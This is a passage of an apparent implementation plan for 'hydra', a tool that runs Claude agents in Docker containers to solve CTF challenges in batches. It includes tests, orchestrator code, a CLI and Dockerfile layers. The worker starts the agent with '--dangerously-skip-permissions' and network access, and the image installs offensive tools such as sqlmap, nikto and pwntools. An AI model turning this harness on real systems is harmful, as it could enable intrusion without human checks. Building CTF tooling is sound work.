        if status == "solved":
            solved.add(name)
        elif status in ("failed", "timeout", "error"):
            failed.add(name)
    return solved, failed
```

- [ ] **Step 4: Run tests, verify pass**

```bash
.venv/bin/pytest tests/unit/test_results.py -v
```
Expected: 5 tests PASS.

- [ ] **Step 5: Commit**

```bash
git add hydra/results.py tests/unit/test_results.py
git commit -m "feat: streaming JSONL + atomic flags.json + final results.json"
```

---

## Task 7: Failure-md generator

**Files:**
- Create: `hydra/failures.py`
- Create: `tests/unit/test_failures.py`

**Why:** User asked for per-failure debug logs. Spec §5 step 7 specifies `./failures/<name>.md` + `./failures/SUMMARY.md`.

- [ ] **Step 1: Write failing tests**

`tests/unit/test_failures.py`:
```python
from pathlib import Path
from hydra.models import Challenge, Result
from hydra.failures import write_failure_md, write_failures_summary

def _mk_result(name="x", status="timeout", reason="wall-clock timeout"):
    return Result(
        name=name, status=status, flag=None,
        duration_s=3600.0, started_at="t0", finished_at="t1",
        worker_exit_code=124, work_dir=f"./runs/{name}/",
        reason=reason,
    )

def test_writes_failure_md(tmp_path: Path):
    c = Challenge(name="x", description="d", category="pwn")
    r = _mk_result("x", "timeout", "timeout after 3600s")
    work_dir = tmp_path / "runs" / "x"
    (work_dir / "logs").mkdir(parents=True)
    (work_dir / "logs" / "claude.stdout.jsonl").write_text(
        "\n".join(f"line {i}" for i in range(100))
    )
    failures_dir = tmp_path / "failures"
    md_path = write_failure_md(c, r, work_dir=work_dir, failures_dir=failures_dir)
    md = md_path.read_text()
    assert "x" in md
    assert "timeout" in md
    assert "line 99" in md  # last 50 lines tail includes recent
    assert "line 50" in md

def test_includes_postmortem(tmp_path: Path):
    c = Challenge(name="x", description="d")
    r = _mk_result("x", "failed", "no flag")
    work_dir = tmp_path / "runs" / "x"
    (work_dir / "logs").mkdir(parents=True)
    (work_dir / "work").mkdir(parents=True)
    (work_dir / "logs" / "claude.stdout.jsonl").write_text("…")
    (work_dir / "work" / "postmortem.md").write_text("tried Wiener, n didn't factor")
    md = write_failure_md(c, r, work_dir=work_dir, failures_dir=tmp_path / "failures").read_text()
    assert "tried Wiener" in md

def test_summary_table(tmp_path: Path):
    results = [
        _mk_result("a", "timeout", "60m"),
        _mk_result("b", "failed", "no flag"),
    ]
    failures_dir = tmp_path / "failures"
    failures_dir.mkdir()
    write_failures_summary(results, failures_dir=failures_dir)
    s = (failures_dir / "SUMMARY.md").read_text()
    assert "| a" in s
    assert "| b" in s
    assert "timeout" in s
```

- [ ] **Step 2: Run tests, verify fail**

```bash
.venv/bin/pytest tests/unit/test_failures.py -v
```

- [ ] **Step 3: Implement `hydra/failures.py`**

```python
from pathlib import Path
from hydra.models import Challenge, Result

def write_failure_md(
    c: Challenge, r: Result, *, work_dir: Path, failures_dir: Path
) -> Path:
    failures_dir.mkdir(parents=True, exist_ok=True)
    md_path = failures_dir / f"{c.name}.md"

    tail = _tail(work_dir / "logs" / "claude.stdout.jsonl", n=50)
    postmortem = _read_or(work_dir / "work" / "postmortem.md", default=None)

    parts = [
        f"# {c.name} — FAILED ({r.status})",
        "",
        f"**Category:** {c.category or 'unknown'}",
        f"**Description:** {c.description or '(none)'}",
        f"**Duration:** {r.duration_s:.1f}s",
        f"**Exit code:** {r.worker_exit_code}",
        "",
        "## Why it failed",
        "",
        r.reason or "(no reason recorded)",
        "",
        "## Last 50 lines of transcript",
        "",
        "```",
        tail or "(empty)",
        "```",
        "",
    ]
    if postmortem:
        parts += ["## Agent postmortem", "", postmortem, ""]
    else:
        parts += ["## Agent postmortem", "", "(none written)", ""]
    parts += [
        "## Reproduction",
        "",
        f"- Full logs:   `{work_dir / 'logs' / 'claude.stdout.jsonl'}`",
        f"- Scratch:     `{work_dir / 'work'}`",
        f"- Input files: `{work_dir / 'challenge'}`",
        "",
    ]
    md_path.write_text("\n".join(parts))
    return md_path

def write_failures_summary(results: list[Result], *, failures_dir: Path) -> Path:
    failures_dir.mkdir(parents=True, exist_ok=True)
    failing = [r for r in results if r.status in ("failed", "timeout", "error")]
    summary_path = failures_dir / "SUMMARY.md"
    lines = [
        f"# {len(failing)} failures out of {len(results)}",
        "",
        "| Challenge | Status | Duration | Reason |",
        "|-----------|--------|----------|--------|",
    ]
    for r in failing:
        reason = (r.reason or "—").replace("\n", " ")[:80]
        lines.append(f"| {r.name} | {r.status} | {r.duration_s:.1f}s | {reason} |")
    summary_path.write_text("\n".join(lines) + "\n")
    return summary_path

def _tail(path: Path, *, n: int) -> str:
    if not path.exists():
        return ""
    lines = path.read_text().splitlines()
    return "\n".join(lines[-n:])

def _read_or(path: Path, *, default):
    if not path.exists():
        return default
    return path.read_text()
```

- [ ] **Step 4: Run tests, verify pass**

```bash
.venv/bin/pytest tests/unit/test_failures.py -v
```
Expected: 3 tests PASS.

- [ ] **Step 5: Commit**

```bash
git add hydra/failures.py tests/unit/test_failures.py
git commit -m "feat: per-failure markdown reports + summary"
```

---

## Task 8: Docker worker wrapper

**Files:**
- Create: `hydra/docker_worker.py`
- Create: `tests/unit/test_docker_worker.py`

**Why:** Spec §5 step 5 — async wrapper around `docker run` that captures stdout/stderr to files, enforces wall-clock timeout, returns exit code + captured stdout string. Tests use `pytest-mock` + a fake async subprocess to avoid needing real docker.

- [ ] **Step 1: Write failing tests**

`tests/unit/test_docker_worker.py`:
```python
import asyncio
from pathlib import Path
import pytest
from hydra.docker_worker import run_worker, WorkerResult

class FakeProc:
    def __init__(self, *, returncode=0, stdout=b"FLAG: flag{x}\n", stderr=b"", delay=0.01):
        self.returncode = returncode
        self._stdout = stdout
        self._stderr = stderr
        self._delay = delay
        self._killed = False

    async def communicate(self):
        await asyncio.sleep(self._delay)
        if self._killed:
            self.returncode = -9
        return self._stdout, self._stderr

    def kill(self):
        self._killed = True

    async def wait(self):
        return self.returncode

@pytest.fixture
def patch_subprocess(monkeypatch):
    captured_cmd = {}
    async def fake_create(*args, **kwargs):
        captured_cmd["cmd"] = args
        captured_cmd["kwargs"] = kwargs
        return captured_cmd.get("proc") or FakeProc()
    monkeypatch.setattr(
        "hydra.docker_worker.asyncio.create_subprocess_exec", fake_create
    )
    return captured_cmd

async def test_basic_run(tmp_path, patch_subprocess):
    wd = tmp_path / "runs" / "x"
    (wd / "logs").mkdir(parents=True)
    result: WorkerResult = await run_worker(
        name="x",
        workdir=wd,
        image="hydra-worker",
        api_key="sk-test",
        model="claude-opus-4-6",
        timeout_s=30,
        container_cpus=2,
        container_memory="4g",
        prompt_volumes={
            Path("/host/CLAUDE.md"): "/workspace/CLAUDE.md",
        },
    )
    assert result.exit_code == 0
    assert "flag{x}" in result.stdout

async def test_timeout_kills_container(tmp_path, monkeypatch):
    slow_proc = FakeProc(delay=5)
    captured = {}
    captured["proc"] = slow_proc

    async def fake_create(*args, **kwargs):
        return slow_proc
    monkeypatch.setattr(
        "hydra.docker_worker.asyncio.create_subprocess_exec", fake_create
    )

    # Stub `docker stop` helper to just mark kill.
    async def fake_stop(*a, **kw): return None
    monkeypatch.setattr("hydra.docker_worker._docker_stop", fake_stop)

    wd = tmp_path / "runs" / "x"
    (wd / "logs").mkdir(parents=True)

    result = await run_worker(
        name="x", workdir=wd, image="hydra-worker",
        api_key="sk", model="m", timeout_s=0.1,
        container_cpus=1, container_memory="1g",
        prompt_volumes={},
    )
    assert result.timed_out is True
    assert result.exit_code != 0

async def test_writes_logs(tmp_path, patch_subprocess):
    wd = tmp_path / "runs" / "x"
    (wd / "logs").mkdir(parents=True)
    await run_worker(
        name="x", workdir=wd, image="hydra-worker",
        api_key="sk", model="m", timeout_s=30,
        container_cpus=1, container_memory="1g",
        prompt_volumes={},
    )
    assert (wd / "logs" / "claude.stdout.jsonl").exists()
    assert (wd / "logs" / "claude.stderr.log").exists()

async def test_command_contains_expected_args(tmp_path, patch_subprocess):
    wd = tmp_path / "runs" / "x"
    (wd / "logs").mkdir(parents=True)
    await run_worker(
        name="x", workdir=wd, image="hydra-worker",
        api_key="sk", model="claude-opus-4-6", timeout_s=30,
        container_cpus=2, container_memory="8g",
        prompt_volumes={Path("/h/CLAUDE.md"): "/workspace/CLAUDE.md"},
    )
    cmd = patch_subprocess["cmd"]
    joined = " ".join(cmd)
    assert "docker" in cmd[0] or "docker" in joined
    assert "run" in cmd
    assert "--rm" in cmd
    assert "--memory" in cmd and "8g" in cmd
    assert "--cpus" in cmd and "2" in cmd
    assert "-e" in cmd  # for ANTHROPIC_API_KEY
    assert "hydra-worker" in cmd
    assert any("claude" in c for c in cmd)
    assert "--model" in cmd
    assert "claude-opus-4-6" in cmd
```

- [ ] **Step 2: Run tests, verify fail**

```bash
.venv/bin/pytest tests/unit/test_docker_worker.py -v
```

- [ ] **Step 3: Implement `hydra/docker_worker.py`**

```python
import asyncio
import os
import uuid
from dataclasses import dataclass
from pathlib import Path

DEFAULT_ENGINE = os.environ.get("HYDRA_CONTAINER_ENGINE", "docker")

_PROMPT = (
    "Solve the CTF challenge in this workspace. Read CLAUDE.md first, "
    "triage the category, dispatch to the appropriate specialist via the "
    "Task tool, recover the flag, write it to ./flag.txt, and echo "
    "`FLAG: <flag>` as the final line of your response."
)

@dataclass
class WorkerResult:
    name: str
    exit_code: int
    stdout: str
    stderr: str
    timed_out: bool
    duration_s: float

async def run_worker(
    *,
    name: str,
    workdir: Path,
    image: str,
    api_key: str,
    model: str,
    timeout_s: float,
    container_cpus: int,
    container_memory: str,
    prompt_volumes: dict[Path, str],
    engine: str = DEFAULT_ENGINE,
) -> WorkerResult:
    container_name = f"hydra-{name}-{uuid.uuid4().hex[:8]}"

    cmd = [
        engine, "run", "--rm",
        "--name", container_name,
        "--network", "bridge",
        "--memory", container_memory,
        "--cpus", str(container_cpus),
        "-v", f"{workdir.resolve()}:/workspace",
    ]
    for src, dest in prompt_volumes.items():
        cmd += ["-v", f"{src.resolve()}:{dest}:ro"]
    cmd += [
        "-e", f"ANTHROPIC_API_KEY={api_key}",
        "-w", "/workspace",
        image,
        "claude", "-p", _PROMPT,
        "--model", model,
        "--dangerously-skip-permissions",
        "--output-format", "stream-json",
    ]

    start = asyncio.get_event_loop().time()
    proc = await asyncio.create_subprocess_exec(
        *cmd,
        stdout=asyncio.subprocess.PIPE,
        stderr=asyncio.subprocess.PIPE,
    )

    timed_out = False
    try:
        stdout_bytes, stderr_bytes = await asyncio.wait_for(
            proc.communicate(), timeout=timeout_s
        )
    except asyncio.TimeoutError:
        timed_out = True
        await _docker_stop(engine, container_name)
        try:
            stdout_bytes, stderr_bytes = await asyncio.wait_for(
                proc.communicate(), timeout=15
            )
        except asyncio.TimeoutError:
            proc.kill()
            await proc.wait()
            stdout_bytes, stderr_bytes = b"", b""

    duration = asyncio.get_event_loop().time() - start
    stdout = stdout_bytes.decode(errors="replace")
    stderr = stderr_bytes.decode(errors="replace")

    (workdir / "logs").mkdir(parents=True, exist_ok=True)
    (workdir / "logs" / "claude.stdout.jsonl").write_text(stdout)
    (workdir / "logs" / "claude.stderr.log").write_text(stderr)

    return WorkerResult(
        name=name,
        exit_code=proc.returncode if proc.returncode is not None else -1,
        stdout=stdout,
        stderr=stderr,
        timed_out=timed_out,
        duration_s=duration,
    )

async def _docker_stop(engine: str, container_name: str) -> None:
    proc = await asyncio.create_subprocess_exec(
        engine, "stop", "--time", "10", container_name,
        stdout=asyncio.subprocess.DEVNULL,
        stderr=asyncio.subprocess.DEVNULL,
    )
    try:
        await asyncio.wait_for(proc.wait(), timeout=15)
    except asyncio.TimeoutError:
        pass
```

- [ ] **Step 4: Run tests, verify pass**

```bash
.venv/bin/pytest tests/unit/test_docker_worker.py -v
```
Expected: 4 tests PASS.

- [ ] **Step 5: Commit**

```bash
git add hydra/docker_worker.py tests/unit/test_docker_worker.py
git commit -m "feat: async docker worker wrapper with timeout + log capture"
```

---

## Task 9: Orchestrator main loop

**Files:**
- Create: `hydra/orchestrator.py`
- Create: `tests/unit/test_orchestrator.py`

**Why:** Spec §5 step 4+5 — async semaphore gate + per-challenge pipeline (workdir → worker → extract → result → failure-md). Keep it pure: take injected workers/writers so tests can replace them.

- [ ] **Step 1: Write failing tests**

`tests/unit/test_orchestrator.py`:
```python
import asyncio
from datetime import datetime, timezone
from pathlib import Path
import pytest
from hydra.models import Challenge, Result
from hydra.orchestrator import Orchestrator, OrchestratorConfig
from hydra.docker_worker import WorkerResult

class FakeWriter:
    def __init__(self):
        self.appended: list[Result] = []
        self.finalized = False
    def append(self, r): self.appended.append(r)
    def finalize(self, *, run_id): self.finalized = True

async def fake_worker_solved(*args, **kwargs) -> WorkerResult:
    return WorkerResult(
        name=kwargs["name"], exit_code=0,
        stdout=f"FLAG: flag{{{kwargs['name']}}}\n",
        stderr="", timed_out=False, duration_s=0.1,
    )

async def fake_worker_failed(*args, **kwargs) -> WorkerResult:
    return WorkerResult(
        name=kwargs["name"], exit_code=1,
        stdout="no flag found\n",
        stderr="boom", timed_out=False, duration_s=0.1,
    )

async def fake_worker_timeout(*args, **kwargs) -> WorkerResult:
    return WorkerResult(
        name=kwargs["name"], exit_code=-9,
        stdout="", stderr="",
        timed_out=True, duration_s=60.0,
    )

async def test_solve_batch(tmp_path, monkeypatch):
    monkeypatch.setattr("hydra.orchestrator.run_worker", fake_worker_solved)
    writer = FakeWriter()
    cfg = OrchestratorConfig(
        parallel=2, timeout_s=30, model="m",
        image="hydra-worker", api_key="sk",
        runs_dir=tmp_path / "runs",
        failures_dir=tmp_path / "failures",
        prompt_volumes={},
    )
    challenges = [
        Challenge(name="a", description="x"),
        Challenge(name="b", description="y"),
    ]
    orch = Orchestrator(cfg, writer=writer)
    await orch.run(challenges)
    names = sorted(r.name for r in writer.appended)
    assert names == ["a", "b"]
    assert all(r.status == "solved" for r in writer.appended)
    assert all(r.flag and "flag{" in r.flag for r in writer.appended)

async def test_respects_parallel_semaphore(tmp_path, monkeypatch):
    concurrent = {"count": 0, "max": 0}
    async def slow_worker(*args, **kwargs):
        concurrent["count"] += 1
        concurrent["max"] = max(concurrent["max"], concurrent["count"])
        await asyncio.sleep(0.05)
        concurrent["count"] -= 1
        return WorkerResult(
            name=kwargs["name"], exit_code=0,
            stdout=f"FLAG: flag{{{kwargs['name']}}}", stderr="",
            timed_out=False, duration_s=0.05,
        )
    monkeypatch.setattr("hydra.orchestrator.run_worker", slow_worker)
    cfg = OrchestratorConfig(
        parallel=2, timeout_s=30, model="m",
        image="hydra-worker", api_key="sk",
        runs_dir=tmp_path / "runs",
        failures_dir=tmp_path / "failures",
        prompt_volumes={},
    )
    challenges = [Challenge(name=f"c{i}", description="x") for i in range(5)]
    orch = Orchestrator(cfg, writer=FakeWriter())
    await orch.run(challenges)
    assert concurrent["max"] <= 2

async def test_timeout_status(tmp_path, monkeypatch):
    monkeypatch.setattr("hydra.orchestrator.run_worker", fake_worker_timeout)
    writer = FakeWriter()
    cfg = OrchestratorConfig(
        parallel=1, timeout_s=1, model="m",
        image="hydra-worker", api_key="sk",
        runs_dir=tmp_path / "runs",
        failures_dir=tmp_path / "failures",
        prompt_volumes={},
    )
    orch = Orchestrator(cfg, writer=writer)
    await orch.run([Challenge(name="a", description="x")])
    [r] = writer.appended
    assert r.status == "timeout"
    assert r.flag is None
    assert (tmp_path / "failures" / "a.md").exists()

async def test_failure_writes_md(tmp_path, monkeypatch):
    monkeypatch.setattr("hydra.orchestrator.run_worker", fake_worker_failed)
    writer = FakeWriter()
    cfg = OrchestratorConfig(
        parallel=1, timeout_s=30, model="m",
        image="hydra-worker", api_key="sk",
        runs_dir=tmp_path / "runs",
        failures_dir=tmp_path / "failures",
        prompt_volumes={},
    )
    orch = Orchestrator(cfg, writer=writer)
    await orch.run([Challenge(name="a", description="x")])
    [r] = writer.appended
    assert r.status == "failed"
    assert (tmp_path / "failures" / "a.md").exists()

async def test_skip_already_solved(tmp_path, monkeypatch):
    monkeypatch.setattr("hydra.orchestrator.run_worker", fake_worker_solved)
    writer = FakeWriter()
    cfg = OrchestratorConfig(
        parallel=1, timeout_s=30, model="m",
        image="hydra-worker", api_key="sk",
        runs_dir=tmp_path / "runs",
        failures_dir=tmp_path / "failures",
        prompt_volumes={},
        skip_names={"a"},
    )
    orch = Orchestrator(cfg, writer=writer)
    await orch.run([Challenge(name="a", description="x"), Challenge(name="b", description="y")])
    names = [r.name for r in writer.appended]
    assert names == ["b"]
```

- [ ] **Step 2: Run tests, verify fail**

```bash
.venv/bin/pytest tests/unit/test_orchestrator.py -v
```

- [ ] **Step 3: Implement `hydra/orchestrator.py`**

```python
import asyncio
import signal
from dataclasses import dataclass, field
from datetime import datetime, timezone
from pathlib import Path
from hydra.models import Challenge, Result
from hydra.workdir import build_workdir
from hydra.flag_extractor import extract_flag
from hydra.failures import write_failure_md, write_failures_summary
from hydra.docker_worker import run_worker, WorkerResult

@dataclass
class OrchestratorConfig:
    parallel: int
    timeout_s: float
    model: str
    image: str
    api_key: str
    runs_dir: Path
    failures_dir: Path
    prompt_volumes: dict[Path, str]
    container_cpus: int = 2
    container_memory: str = "8g"
    skip_names: set[str] = field(default_factory=set)

class Orchestrator:
    def __init__(self, cfg: OrchestratorConfig, *, writer):
        self.cfg = cfg
        self.writer = writer
        self._sem: asyncio.Semaphore | None = None
        self._results: list[Result] = []

    async def run(self, challenges: list[Challenge]) -> None:
        self._sem = asyncio.Semaphore(self.cfg.parallel)
        work = [
            self._one(c) for c in challenges if c.name not in self.cfg.skip_names
        ]
        try:
            await asyncio.gather(*work)
        finally:
            if self._results:
                write_failures_summary(
                    self._results, failures_dir=self.cfg.failures_dir
                )

    async def _one(self, c: Challenge) -> None:
        assert self._sem is not None
        async with self._sem:
            started = _now_iso()
            wd = build_workdir(c, runs_dir=self.cfg.runs_dir)
            wr: WorkerResult = await run_worker(
                name=c.name,
                workdir=wd,
                image=self.cfg.image,
                api_key=self.cfg.api_key,
                model=self.cfg.model,
                timeout_s=self.cfg.timeout_s,
                container_cpus=self.cfg.container_cpus,
                container_memory=self.cfg.container_memory,
                prompt_volumes=self.cfg.prompt_volumes,
            )
            flag = extract_flag(flag_file=wd / "flag.txt", stdout=wr.stdout)

            if wr.timed_out:
                status, reason = "timeout", f"wall-clock timeout after {self.cfg.timeout_s}s"
            elif flag:
                status, reason = "solved", None
            elif wr.exit_code != 0:
                status, reason = "error", (wr.stderr[-1024:] or "non-zero exit")
            else:
                status, reason = "failed", "no flag recovered from stdout or flag.txt"

            r = Result(
                name=c.name, status=status, flag=flag,
                duration_s=wr.duration_s,
                started_at=started, finished_at=_now_iso(),
                worker_exit_code=wr.exit_code,
                work_dir=str(wd),
                reason=reason,
            )
            self._results.append(r)
            self.writer.append(r)
            if status != "solved":
                write_failure_md(c, r, work_dir=wd, failures_dir=self.cfg.failures_dir)
            _print_status(r)

def _now_iso() -> str:
    return datetime.now(tz=timezone.utc).isoformat().replace("+00:00", "Z")

def _print_status(r: Result) -> None:
    sym = "✓" if r.status == "solved" else "✗"
    detail = r.flag if r.status == "solved" else f"({r.reason or r.status})"
    print(f"{sym} {r.name:24s} → {detail} ({r.duration_s:.1f}s)", flush=True)
```

- [ ] **Step 4: Run tests, verify pass**

```bash
.venv/bin/pytest tests/unit/test_orchestrator.py -v
```
Expected: 5 tests PASS.

- [ ] **Step 5: Commit**

```bash
git add hydra/orchestrator.py tests/unit/test_orchestrator.py
git commit -m "feat: async orchestrator with semaphore + per-challenge pipeline"
```

---

## Task 10: CLI entry point

**Files:**
- Create: `hydra/cli.py`
- Create: `tests/unit/test_cli.py`

**Why:** Spec §6 — single command, 10 flags, file-or-stdin input. Keep CLI thin: parse args, load JSON, build config, delegate to Orchestrator.

- [ ] **Step 1: Write failing tests**

`tests/unit/test_cli.py`:
```python
import json
import sys
from pathlib import Path
import pytest
from hydra.cli import build_parser, resolve_config

def test_parser_defaults():
    p = build_parser()
    ns = p.parse_args(["chal.json"])
    assert ns.challenges == "chal.json"
    assert ns.parallel == 8
    assert ns.timeout == 3600
    assert ns.model == "claude-opus-4-6"
    assert ns.retry_failed is False
    assert ns.only is None

def test_parser_overrides():
    p = build_parser()
    ns = p.parse_args([
        "-",
        "--parallel", "4",
        "--timeout", "600",
        "--model", "claude-haiku-4-5",
        "--retry-failed",
        "--only", "a,b,c",
    ])
    assert ns.challenges == "-"
    assert ns.parallel == 4
    assert ns.timeout == 600
    assert ns.model == "claude-haiku-4-5"
    assert ns.retry_failed is True
    assert ns.only == "a,b,c"

def test_resolve_config_requires_api_key(monkeypatch, tmp_path):
    monkeypatch.delenv("ANTHROPIC_API_KEY", raising=False)
    ns = build_parser().parse_args([str(tmp_path / "x.json")])
    with pytest.raises(SystemExit):
        resolve_config(ns, root=tmp_path)

def test_resolve_config_uses_env_api_key(monkeypatch, tmp_path):
    monkeypatch.setenv("ANTHROPIC_API_KEY", "sk-xyz")
    ns = build_parser().parse_args([str(tmp_path / "x.json")])
    cfg = resolve_config(ns, root=tmp_path)
    assert cfg.api_key == "sk-xyz"
    assert cfg.parallel == 8
    assert cfg.runs_dir == tmp_path / "runs"
    assert cfg.failures_dir == tmp_path / "failures"

def test_only_filter_applies(monkeypatch, tmp_path):
    monkeypatch.setenv("ANTHROPIC_API_KEY", "sk")
    ns = build_parser().parse_args([str(tmp_path / "x.json"), "--only", "a,c"])
    cfg = resolve_config(ns, root=tmp_path)
    assert cfg.only_filter == {"a", "c"}
```

- [ ] **Step 2: Run tests, verify fail**

```bash
.venv/bin/pytest tests/unit/test_cli.py -v
```

- [ ] **Step 3: Implement `hydra/cli.py`**

```python
import argparse
import asyncio
import json
import os
import sys
from dataclasses import dataclass, field
from datetime import datetime, timezone
from pathlib import Path

from hydra.normalize import normalize_challenges, NormalizationError
from hydra.orchestrator import Orchestrator, OrchestratorConfig
from hydra.results import ResultsWriter, load_jsonl_names

DEFAULT_MODEL = "claude-opus-4-6"

@dataclass
class ResolvedConfig:
    challenges_path: str
    api_key: str
    parallel: int
    timeout: int
    model: str
    runs_dir: Path
    results_path: Path
    jsonl_path: Path
    flags_path: Path
    failures_dir: Path
    retry_failed: bool
    only_filter: set[str] | None
    dry_run: bool
    rebuild_image: bool
    image: str = "hydra-worker"

def build_parser() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(
        prog="hydra",
        description="Autonomous CTF batch solver — JSON in, flags out.",
    )
    p.add_argument("challenges", help="Path to challenges JSON (or '-' for stdin)")
    p.add_argument("--parallel", type=int, default=8, help="Concurrent workers")
    p.add_argument("--timeout", type=int, default=3600, help="Per-challenge wall-clock (s)")
    p.add_argument("--model", default=DEFAULT_MODEL, help="Claude model")
    p.add_argument("--retry-failed", action="store_true",
                   help="Re-run entries currently marked failed/timeout/error")
    p.add_argument("--only", default=None,
                   help="Comma-separated names to run (skip others)")
    p.add_argument("--runs-dir", default=None, help="Where to put ./runs/")
    p.add_argument("--results", default=None, help="Path for results.json")
    p.add_argument("--jsonl", default=None, help="Path for results.jsonl")
    p.add_argument("--flags-out", default=None, help="Path for flags.json")
    p.add_argument("--dry-run", action="store_true", help="Normalize + set up workdirs only")
    p.add_argument("--rebuild-image", action="store_true", help="Force docker build first")
    return p

def resolve_config(ns: argparse.Namespace, *, root: Path) -> ResolvedConfig:
    api_key = os.environ.get("ANTHROPIC_API_KEY", "").strip()
    if not api_key:
        print("error: ANTHROPIC_API_KEY not set in environment", file=sys.stderr)
        raise SystemExit(2)
    return ResolvedConfig(
        challenges_path=ns.challenges,
        api_key=api_key,
        parallel=ns.parallel,
        timeout=ns.timeout,
        model=ns.model,
        runs_dir=Path(ns.runs_dir) if ns.runs_dir else root / "runs",
        results_path=Path(ns.results) if ns.results else root / "results.json",
        jsonl_path=Path(ns.jsonl) if ns.jsonl else root / "results.jsonl",
        flags_path=Path(ns.flags_out) if ns.flags_out else root / "flags.json",
        failures_dir=root / "failures",
        retry_failed=ns.retry_failed,
        only_filter=_parse_only(ns.only),
        dry_run=ns.dry_run,
        rebuild_image=ns.rebuild_image,
    )

def _parse_only(spec: str | None) -> set[str] | None:
    if not spec:
        return None
    return {s.strip() for s in spec.split(",") if s.strip()}

def _read_input(path: str) -> list:
    raw = sys.stdin.read() if path == "-" else Path(path).read_text()
    return json.loads(raw)

def _prompt_volumes(root: Path) -> dict[Path, str]:
    return {
        root / "CLAUDE.md": "/workspace/CLAUDE.md",
        root / ".claude": "/workspace/.claude",
        root / "exploits": "/workspace/exploits",
    }

def _compute_skips(cfg: ResolvedConfig) -> set[str]:
    solved, failed = load_jsonl_names(cfg.jsonl_path)
    skip = set(solved)
    if not cfg.retry_failed:
        skip |= failed
    return skip

async def _run(cfg: ResolvedConfig) -> int:
    raw = _read_input(cfg.challenges_path)
    try:
        challenges = normalize_challenges(raw)
    except NormalizationError as e:
        print(f"error: {e}", file=sys.stderr)
        return 2

    if cfg.only_filter is not None:
        challenges = [c for c in challenges if c.name in cfg.only_filter]

    skip = _compute_skips(cfg)

    if cfg.dry_run:
        print(f"dry-run: {len(challenges)} challenges normalized", flush=True)
        return 0

    root = Path.cwd()
    writer = ResultsWriter(
        jsonl_path=cfg.jsonl_path,
        flags_path=cfg.flags_path,
        results_path=cfg.results_path,
    )
    orch_cfg = OrchestratorConfig(
        parallel=cfg.parallel,
        timeout_s=cfg.timeout,
        model=cfg.model,
        image=cfg.image,
        api_key=cfg.api_key,
        runs_dir=cfg.runs_dir,
        failures_dir=cfg.failures_dir,
        prompt_volumes=_prompt_volumes(root),
        skip_names=skip,
    )
    orch = Orchestrator(orch_cfg, writer=writer)
    run_id = datetime.now(tz=timezone.utc).isoformat().replace("+00:00", "Z")
    try:
        await orch.run(challenges)
    finally:
        writer.finalize(run_id=run_id)
    return 0 if any(r.status == "solved" for r in writer._results) else 1

def main(argv: list[str] | None = None) -> int:
    ns = build_parser().parse_args(argv)
    cfg = resolve_config(ns, root=Path.cwd())
    return asyncio.run(_run(cfg))

if __name__ == "__main__":
    raise SystemExit(main())
```

- [ ] **Step 4: Run tests, verify pass**

```bash
.venv/bin/pytest tests/unit/test_cli.py -v
```
Expected: 5 tests PASS.

- [ ] **Step 5: Commit**

```bash
git add hydra/cli.py tests/unit/test_cli.py
git commit -m "feat: CLI entry point with argparse + config resolution"
```

---

## Task 11: Wire it up + dry-run smoke

**Files:**
- Modify: `pyproject.toml` (already configured in Task 1, verify)
- Create: `tests/fixtures/challenges/smoke.json`

**Why:** Prove the CLI end-to-end in dry-run mode before we have a real Docker image.

- [ ] **Step 1: Create smoke fixture**

`tests/fixtures/challenges/smoke.json`:
```json
[
  {"name": "hello", "description": "Just a sanity check."},
  {"name": "there", "description": "Another one."}
]
```

- [ ] **Step 2: Install editable and verify entry point**

```bash
.venv/bin/pip install -e .
.venv/bin/hydra --help
```
Expected: argparse help text, exits 0.

- [ ] **Step 3: Dry-run smoke**

```bash
ANTHROPIC_API_KEY=sk-dryrun .venv/bin/hydra tests/fixtures/challenges/smoke.json --dry-run
```
Expected: `dry-run: 2 challenges normalized`, exits 0.

- [ ] **Step 4: Run full test suite**

```bash
.venv/bin/pytest -v
```
Expected: all unit tests pass.

- [ ] **Step 5: Commit**

```bash
git add tests/fixtures/challenges/smoke.json
git commit -m "chore: add smoke fixture and verify CLI dry-run"
```

---

## Task 12: Dockerfile — base system + Python CTF stack

**Files:**
- Create: `Dockerfile`
- Create: `docker/apt-packages.txt`
- Create: `docker/requirements-ctf.txt`

**Why:** Spec §4.2 — layered image. Keep system packages + Python CTF libs together since both rarely change. Web/rev/crypto/forensics tooling in next task.

- [ ] **Step 1: Create apt package list**

`docker/apt-packages.txt` (one package per line, feeds the apt layer):
```
build-essential
git
curl
wget
ca-certificates
jq
xxd
file
unzip
tar
python3
python3-pip
python3-dev
python3-venv
nodejs
npm
ruby
ruby-dev
```

- [ ] **Step 2: Create Python CTF requirements**

`docker/requirements-ctf.txt`:
```
pwntools==4.13.*
z3-solver==4.13.*
angr==9.2.*
pycryptodome==3.20.*
gmpy2==2.2.*
sympy==1.13.*
requests==2.32.*
beautifulsoup4==4.12.*
pyjwt==2.10.*
r2pipe==1.9.*
ROPgadget==7.6
volatility3==2.8.*
```

- [ ] **Step 3: Write the initial Dockerfile**

`Dockerfile`:
```dockerfile
FROM ubuntu:24.04

ENV DEBIAN_FRONTEND=noninteractive \
    PYTHONDONTWRITEBYTECODE=1 \
    PIP_NO_CACHE_DIR=1 \
    PIP_BREAK_SYSTEM_PACKAGES=1

# System layer (rare churn)
COPY docker/apt-packages.txt /tmp/apt-packages.txt
RUN apt-get update \
 && xargs -a /tmp/apt-packages.txt apt-get install -y --no-install-recommends \
 && rm -rf /var/lib/apt/lists/*

# Python CTF stack (rare churn)
COPY docker/requirements-ctf.txt /tmp/requirements-ctf.txt
RUN pip install -r /tmp/requirements-ctf.txt

WORKDIR /workspace
```

- [ ] **Step 4: Build the image and verify it runs Python + pwntools**

```bash
docker build -t hydra-worker:base .
docker run --rm hydra-worker:base python3 -c "import pwn, z3, angr, Crypto, gmpy2; print('ok')"
```
Expected: prints `ok`. If any import fails, pin an earlier minor version in `requirements-ctf.txt` and rebuild.

- [ ] **Step 5: Commit**

```bash
git add Dockerfile docker/
git commit -m "feat: Dockerfile base layer with system + python CTF stack"
```

---

## Task 13: Dockerfile — tools + Claude CLI

**Files:**
- Modify: `Dockerfile`

**Why:** Add web scanners, reverse tools, crypto helpers, forensics utilities, and the Claude CLI. These change slightly more often than the base layer, so they live above.

- [ ] **Step 1: Append to Dockerfile**

Append these layers to `Dockerfile` (after the existing Python stack layer):

```dockerfile
# Web tooling
RUN apt-get update \
 && apt-get install -y --no-install-recommends \
    ffuf gobuster sqlmap nikto wfuzz \
 && rm -rf /var/lib/apt/lists/*

# Reverse tooling
RUN apt-get update \
 && apt-get install -y --no-install-recommends \
    radare2 ltrace strace upx-ucl \
 && rm -rf /var/lib/apt/lists/*

